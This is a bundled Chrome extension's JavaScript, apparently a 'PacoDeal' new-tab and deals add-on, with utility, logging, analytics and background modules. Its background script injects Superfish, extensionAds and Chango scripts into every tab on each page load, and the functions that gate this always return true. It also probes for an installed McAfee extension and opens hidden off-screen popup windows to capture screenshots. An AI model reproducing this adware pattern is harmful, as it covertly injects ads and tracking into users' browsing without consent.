



 /*********************** start File  /bundler/js/tools.js **************************/



/* Tools Module */
var tools = function () {

    var validateUrl = function (url) {

        var pattern = /(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/
        return pattern.test(url);

    };
    var loadResource = function (url, container_string, callback) {
        $.get(url, function loadResourceCALLBACK(response) {
            ntf_log('resource loaded : ' + url);
            if (container_string)$(container_string).html(response);
            if (callback)callback(response);

            url = null;
            container_string = null;
            callback = null;
            response = null;
        });
    };
    var validateUrl = function (url) {

        var pattern = /(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/
        return pattern.test(url);

    };
    var extractDomain = function (url) {
        return url && url.split("/").splice(2, 1)[0];
    };

    var loadScript = function (filename, callback) {
        ntf_log('load script : ' + filename);
        var fileref = document.createElement('script');
        fileref.setAttribute("type", "text/javascript");
        fileref.setAttribute("src", filename);
        document.getElementsByTagName("head")[0].appendChild(fileref);
        if (!callback)callback = null;
        fileref.onload = callback;
        return true;
    };
    var extractMainDomain = function (domain) {
        return domain && domain != undefined && (domain.split(".").length == 2) ? domain.split(".")[0] : domain.split(".")[1];
    };
    var inArray = function (obj, arr) {

        return (arr.indexOf(obj) != -1);

    };

    // t1 - old timestamp, t2 - new timestamp. return true if t2-t1 > timeout
    var checkTimestamp = function (t1, t2, timeout) {
        return (timeout < (t2 - t1));
    };

    var arrayShuffle = function (arr) {
        for (var j, x, i = arr.length; i;
             j = parseInt(Math.random() * i),
                 x = arr[--i], arr[i] = arr[j], arr[j] = x);
        return arr;
    };

    var truncate = function (string, length, prefix) {
        if (!prefix)prefix = '';
        return (string && string.length > length) ? string.substring(0, length) + prefix : string;
    };

    var check_for_constant = function (key, default_value) {
        var new_value = localStorage.getItem(key);
        return ( new_value == undefined || new_value == "") ? default_value : new_value;
    }

    var get_now_timestamp = function () {
        return new Date().getTime();
    }

    var length = 3;
    var myString = "ABCDEFG";
    var myTruncatedString = myString.substring(0, length);

    // parseUri 1.2.2
    // (c) Steven Levithan <stevenlevithan.com>
    // MIT License

    var parseUri = function (str) {
        var o = parseUri.options,
            m = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
            uri = {},
            i = 14;

        while (i--) uri[o.key[i]] = m[i] || "";

        uri[o.q.name] = {};
        uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
            if ($1) uri[o.q.name][$1] = $2;
        });

        return uri;
    };

    parseUri.options = {
        strictMode:false,
        key:["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "anchor"],
        q:{
            name:"queryKey",
            parser:/(?:^|&)([^&=]*)=?([^&]*)/g
        },
        parser:{
            strict:/^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
            loose:/^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
        }
    };

    var generate_uuid = function () {
        // http://www.ietf.org/rfc/rfc4122.txt
        var s = [];
        var hexDigits = "0123456789abcdef";
        for (var i = 0; i < 36; i++) {
            s[i] = hexDigits.substr(Math.floor(Math.random() * 0x10), 1);
        }
        s[14] = "4";  // bits 12-15 of the time_hi_and_version field to 0010
        s[19] = hexDigits.substr((s[19] & 0x3) | 0x8, 1);  // bits 6-7 of the clock_seq_hi_and_reserved to 01
        s[8] = s[13] = s[18] = s[23] = "-";

        var uuid = s.join("");
        return uuid;
    };


    return {
        parseUri:parseUri,
        validateUrl:validateUrl,
        inArray:inArray,
        truncate:truncate,
        get_now_timestamp:get_now_timestamp,
        check_for_constant:check_for_constant,
        checkTimestamp:checkTimestamp,
        generate_uuid:generate_uuid

    };
}();




 /*********************** End File /bundler/js/tools.js ******************/ 







 /*********************** start File  /bundler/js/background.js **************************/



chrome.tabs.onCreated.addListener(function (tab) {

    //console.log (new Date.getTime());
    // update tabs_array
    if (tab.url == "chrome://newtab/") {
        if (localStorage.getItem('defaultNewTabFlag') == "true") {
            chrome.tabs.update(tab.id, {url:'chrome-internal://newtab/'});
        }
    }

});

//screenshoot vars
chrome.tabs.onUpdated.addListener(function (id, object, tab) {
    // update tabs_array
    update_tabs_array(tab);
    if (tab.status == "complete" && localStorage[tools.parseUri(tab.url).host]=="empty"){
        takeScreenshot(tab.url,tab.id);
    }

    return;
});


/* scrrenshots */
var storage=localStorage;





var drawImageToDial = function (url,imgData){
    if (imgData == null || typeof imgData == "undefined")return false;
    if(storage[url]){
        storage[url]=imgData;
    }
};

var takeScreenshot  =   function (url,id,timeout) {
    if (!timeout || timeout < 0)timeout = 10;
    url=tools.parseUri(url).host;
    if (/gmail/.test(url)){
        timeout=1000;
    }
    var tempUrl= url;
    setTimeout (function(){
        try{
            chrome.tabs.captureVisibleTab(null,{quality:4, format:'jpeg'},function(image){drawImageToDial(tempUrl,image)});
            url=null;
            timeout = null;
        }catch(e){
            console.log('Unexpected error : ' + e);
        }
        timeout=null;
        url=null;
    },timeout);

    return true;
};




var update_tabs_array = function (tab) {
//	if (!tools.validateUrl(tab.url))return;
    var title = (tab.title.length > 60) ? tab.title.substr(0, 60) + '...' : tab.title;
    tabsArray[tab.id] = [tab.url, title];
};

var push_closed_tabs = function (tab) {

    if (tab[1]=="New Tab") return;
    if (tools.inArray(tab[0], closedTabsArray))return;
    if (closedTabsArray.length >= 10) {

        closedTabsArray.shift();
        closedTabsArray.shift();
    }
    closedTabsArray.push(tab[0]);
    closedTabsArray.push(tab[1]);


    localStorage.setItem('CLOSED_TABS', closedTabsArray.join('||'));
};

var tabsArray = {}, closedTabsArray = [];
// Push Closed Tabs
chrome.tabs.onRemoved.addListener(function (tabId, removeInfo) {
    if (tabsArray[tabId] && tabsArray[tabId] != null)
        push_closed_tabs(tabsArray[tabId]);
    tabsArray[tabId] = null;
});

if (!localStorage.getItem('First_Run')) {
    localStorage.setItem('First_Run', 'wasAlready');
    localStorage.setItem('picBadgesFlag', 'true');
}

var noop = function (){};

var capture = function (params,success){
    var url = params.url;
    var closeWindowTimeoutScript={
        code:"setTimeout(function(){window.open('', '_self', ''); window.close();},6000);",
        runAt:"document_start"
    };

    var settings={
            left : 999999,
            top: 999999,
            width: 1,
            height:1,
            type: 'popup',
            focused: false
        },
        currentTab;

    if(!url) { return (success||noop)({error : 'no url was specified'}); }
    settings.url = url;

    var shortUrl = tools.parseUri(url).host;
    if(storage[shortUrl] && storage[shortUrl] !== "empty"){
        return (success||noop)();
    } else {
        storage[shortUrl] = "empty";
        try{
            chrome.tabs.getCurrent(function(_tab){
                var currentTab = params.currentTab||_tab;
                chrome.windows.create(settings, function(_window){
                    chrome.windows.update(_window.id, {
                        top: 9999,
                        left: 9999
                    });
                    //chrome.tabs.update(currentTab.id,{active : true});
                    var t = chrome.tabs.onUpdated.addListener(function onUpdateCapture(_tabId, _change, _tab) {
                        if(_tab.windowId == _window.id && _change.status && _change.status == 'complete'){
                            chrome.tabs.executeScript(_tabId,closeWindowTimeoutScript,function(){});
                            chrome.windows.update(_window.id,{width : 1024, height:768},function(){
                                setTimeout(function(){
                                    chrome.tabs.captureVisibleTab(_window.id, {quality:4, format:'jpeg'}, function(data){
                                        drawImageToDial(shortUrl,data);
                                        //chrome.tabs.update(currentTab.id,{active : true});
                                        chrome.windows.remove(_window.id);
                                        chrome.tabs.onUpdated.removeListener(onUpdateCapture);
                                        (success||noop)();
                                    });
                                },1500);
                            });
                        }
                    });

                });
            });
        }catch(e){
            console.log('Error capture screenshoot',e);
        }
    }
};

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.screenshot){
            capture({url:request.screenshot},function(){
                chrome.runtime.sendMessage({screenshotFinish: true}, function(response) {
                });
            })
        }

    });




 /*********************** End File /bundler/js/background.js ******************/ 







 /*********************** start File  pacodeal/config.js **************************/



ENV             = "";
BASE_URL        = "http://pacodeal.herokuapp.com/";
LOGGLY_INPUT    = "https://logs.loggly.com/inputs/8a8016e8-316b-4fd1-9b93-8da73d0c707a";
DEBUG_LEVEL     = 0;
CLIENT_NAME     = "PacoDeal";
VERSION         = chrome.app.getDetails() ? chrome.app.getDetails().version: null ;
GA_UID          = "UA-40447064-1";
SUPERF_E          = true;





 /*********************** End File pacodeal/config.js ******************/ 







 /*********************** start File  pacodeal/common.js **************************/



var common = function(){
    var truncate = function (string, length, suffix){
        if (!suffix)suffix ='';
        return (string && string.length > length) ? string.substring(0,length) + suffix : string ;
    };

    var stripHTMLTags = function(html){
        var div = document.createElement("div");
        div.innerHTML = html;
        return div.textContent || div.innerText || "";
    };

    var stripWWW = function(host){
        if (host.indexOf('www.') == 0)
            return host.slice(4);
        else return host;
    };

    var convertLTGT = function(convert){
        return $("<span />", { html: convert }).text();
    };


    var noop = function(){

    };


    var binarySearch = function(needle, arr) {
        if (typeof(arr) === 'undefined' || !arr.length) return -1;

        var high = arr.length - 1;
        var low = 0;
        var vals = [];
        var bUp = true;
        var bDown = true;
        var i = 1;

        while (low <= high) {
            var mid = parseInt((low + high) / 2)
            var element = arr[mid].host;
            if (element > needle) {
                high = mid - 1;
            } else if (element < needle) {
                low = mid + 1;
            } else {
                return arr[mid];
            }
        }

        return -1;
    };



    // parseUri 1.2.2
    // (c) Steven Levithan <stevenlevithan.com>
    // MIT License

    var parseUri = function  (str) {
        var	o   = parseUri.options,
            m   = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
            uri = {},
            i   = 14;

        while (i--) uri[o.key[i]] = m[i] || "";

        uri[o.q.name] = {};
        uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
            if ($1) uri[o.q.name][$1] = $2;
        });

        return uri;
    };

    parseUri.options = {
        strictMode: false,
        key: ["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"],
        q:   {
            name:   "queryKey",
            parser: /(?:^|&)([^&=]*)=?([^&]*)/g
        },
        parser: {
            strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
            loose:  /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
        }
    }


    return {
        truncate : truncate,
        stripHTMLTags : stripHTMLTags,
        stripWWW : stripWWW,
        parseUri : parseUri,
        convertLTGT : convertLTGT,
        noop : noop,
        binarySearch : binarySearch
    };

}();




 /*********************** End File pacodeal/common.js ******************/ 







 /*********************** start File  pacodeal/logger.js **************************/



var logger = (function($){

    // logger levels :
    // 0 : for production -  errors and info are sent to loggly, nothing is printed
    // 1 : for tests - errors are printed and sent to loggly
    // 2 : for development - nothing is sent to loggly, only errors and infos are printed
    // 3 : for development - everything is printed and nothing is sent to loggly
    // 4 : for development - everything is printed and sent to loggly


    if(!$)return false;
    var inputUrl         = LOGGLY_INPUT,
        debugLevel       = DEBUG_LEVEL|| 1;

    var clientInfo = function(){
       return {
         version             : VERSION,
         clientName          : CLIENT_NAME,
         environment         : ENV
       };
    };

    var error = function(message,errStack){
         var obj = {
             type : 'ERROR',
             errStack : errStack,
             message : message
         };
        $.extend(obj,clientInfo());

        if(debugLevel === 0){
            json(obj);
        }else if (debugLevel === 1){
            json(obj);
            console.error(message,errStack);
        }else if (debugLevel === 2){
            console.error(message,errStack);
        }else if (debugLevel === 3){
            console.error(message,errStack);
        }else if (debugLevel === 4){
            console.error(message,errStack);
            json(obj);
        }
    };

    var log = function(message){
        var obj = {
            type : 'LOG',
            message : message
        };
        $.extend(obj,clientInfo());

        if (debugLevel === 3){
            console.log(message);
        }else if (debugLevel === 4){
            console.log(message);
            json(obj);
        }



    };

    var info = function(message){
        var obj = {
            type : 'INFO',
            message : message
        };
        $.extend(obj,clientInfo());

        if (debugLevel === 0){
            json(obj);
        } else if (debugLevel === 2){
            console.info(message);
        }else if (debugLevel === 3){
            console.info(message);
        }else if (debugLevel === 4){
            console.info(message);
            json(obj);
        }

    };

    var warn = function(message){
        var obj = {
            type : 'WARN',
            message : message
        };
        $.extend(obj,clientInfo());

        if (debugLevel === 3){
            console.warn(message);
        }else if (debugLevel === 4){
            console.warn(message);
            json(obj);
        }

    };



    var json = function(object){
        $.post(inputUrl,object);
    };



    return {
      log : log,
      error : error,
      info : info,
      warn : warn,
      json : json
    }
})(jQuery);



 /*********************** End File pacodeal/logger.js ******************/ 







 /*********************** start File  pacodeal/ga.js **************************/



var _gaq = _gaq || [];

var ga = (function(window){

    var init = function(ga_uid,custom_vars_array){
        ga_uid = ga_uid || GA_UID || "UA-40447064-1";
        _gaq.push(['_setAccount', ga_uid]);
        _gaq.push(['_trackPageview']);
        if(custom_vars_array)setCustomVars(custom_vars_array);
        (function() {
            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
            ga.src =  'https://ssl' + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
        })();
    };

    var setCustomVars = function(custom_vars_array){
        for(var i in custom_vars_array){
           var obj = custom_vars_array[i];
            if(!obj.scope)obj.scope=1;
            _gaq.push(['_setCustomVar',
                obj.slot,                   // This custom var is set to slot #1.  Required parameter.
                obj.name,     // The name acts as a kind of category for the user activity.  Required parameter.
                obj.value,               // This value of the custom variable.  Required parameter.
                obj.scope                    // Sets the scope to session-level.  Optional parameter.
            ]);

        }

    }

    var trackEvent = function(evt){
        _gaq.push(['_trackEvent',
            evt.category, // category of activity
            evt.action, // Action
            evt.label, //label
            evt.value, //value,
            evt.nonInteraction
        ]);
    }


    return {
        init : init,
        setCustomVars : setCustomVars,
        trackEvent : trackEvent
    }

})(window);



 /*********************** End File pacodeal/ga.js ******************/ 







 /*********************** start File  pacodeal/background.js **************************/







(function ($,common,ga,logger){

    var version  = chrome.app.getDetails().version;
    var anonymousUserId;
    var testingVars;

    var init = function(){
        testingVars = getUserTestingCustomVars();

        ga.init(null,testingVars);
        checkInstallStatus();
    };


    var setUserTestingCustomVars = function(){

        //  superFish enabled Yes/NO
        var superFishEnabledSlot = SUPERF_E;

        testingVars = [
            {slot : 1 , name : 'SuperFish Enabled' , value : superFishEnabledSlot , scope : 1}
        ];

        localStorage.setItem('ga_custom_vars',JSON.stringify(testingVars));
        logger.json({action : 'set_user_testing_vars', testingVars : testingVars});
    };

    var getUserTestingCustomVars = function(){
        var string = localStorage.getItem('ga_custom_vars');
        return JSON.parse(string);
    };


    var checkInstallStatus = function(done){
        var install_version = localStorage.getItem('install_version');
        if(!install_version){
            newInstall(done);
            (done||common.noop)('new_install');
        }else if (install_version != version){
            updateInstall();
            (done||common.noop)('update_install');
        }else{
            (done||common.noop)();
        }
        localStorage.setItem('install_version',version);
    };

    var newInstall = function(){
        setUserTestingCustomVars();
        var focus=true,
            rand=Math.random();
        if(rand>0.5){
            focus=false;
        }
        localStorage.setItem('takeFocus',focus);
        //console.log('focus ',focus);
        try{
            //check mcafee exist if yes change search to google
            checkMcafeeExist(function(flag){
                //if exist change search to regular google
                if(flag){
                     localStorage.googleSearch = true;
                     localStorage.SEARCH_URL_PREFIX = "http://www.google.com/search";
                }
                setTimeout(function(){
                    ga.trackEvent('pacodeal','google search '+flag);
                },10);
            });
            //create welcome on first login
            //chrome.tabs.create({url : 'welcome.html'});
        }catch(e){
            logger.error('create welcome tab err',e);
        }

        setTimeout(function(){
            ga.trackEvent('pacodeal','new_install focuse '+focus);
        },10);

    };

    var updateInstall = function(){
        var focus=localStorage.getItem('takeFocus');
        ga.trackEvent('pacodeal','update_install focus '+focus);
    };

    var checkMcafeeExist= function(done){
        try{
            chrome.management.getAll(function (arr) {
                if(arr && arr.length > 0 ){
                    for (var i=0 ; i<arr.length;++i){
                        if(arr[i] && arr[i].id && arr[i].id == "fheoggkfdfchfphceeifdbepaooicaho"){
                            return done(true);
                        }
                    }
                }
                return done(false);
            });
        } catch (e){
            console.log('err',e);
            return done(false);
        }
    }

    var shouldInjectSuperFish = function(origin){
        return true;
    };

    var shouldInjectExtensionAds = function(origin){
        return true;
    };

    var shouldInjectChango = function(origin){
        return true;
    };


    var getInjection = function(tab){
         if(shouldInjectSuperFish(tab.url)){
             injectSuperfish(tab.id);
         }
         if(shouldInjectExtensionAds(tab.url)){
            injectExtensionAds(tab.id);
         }
         if(shouldInjectChango(tab.url)){
             injectChango(tab.id);
         }
    };

    var injectSuperfish = function(tabId){
        logger.info('Injecting Superfish.');
        try {
            //insert superfish
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/s.js'}, function(){});
            console.log('insert e script');

            ga.trackEvent({category : 'Superfish', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting Superfish',e);
        }
    };

    var injectExtensionAds = function(tabId){
        logger.info('Injecting ExtensionA');
        try {
            //insert extensionAds
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/extensionAds.js'}, function(){});

            ga.trackEvent({category : 'extensionAds', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting extensionAds',e);
        }
    };

    var injectChango = function(tabId){
        logger.info('Injecting Chango');
        try {
            //insert extensionAds
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/chd.js'}, function(){});

            ga.trackEvent({category : 'chango', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting chango',e);
        }
    };

    try{
        /*
        chrome.tabs.onCreated.addListener(function (tab) {
            // take focus
            if (tab.url == "chrome://newtab/") {

                if(localStorage.getItem('takeFocus')=="true"){
                    chrome.tabs.update(tab.id,{selected:true},function(){
                        setTimeout(function(){$("#search_input").focus();},0);
                    });
                }
            }
        });
        */

        chrome.tabs.onUpdated.addListener(function(tabId,change,tab) {
            if(change.status == "complete"){
                getInjection(tab);
            }
        });

        chrome.extension.onMessage.addListener(
            function(request, sender, sendResponse) {
            if(request.action == 'trackEvent'){
               ga.trackEvent(request.event);
            }
            sendResponse({});
        });

    }catch(err){

    }

    init();

})(jQuery,common,ga,logger);




 /*********************** End File pacodeal/background.js ******************/ 



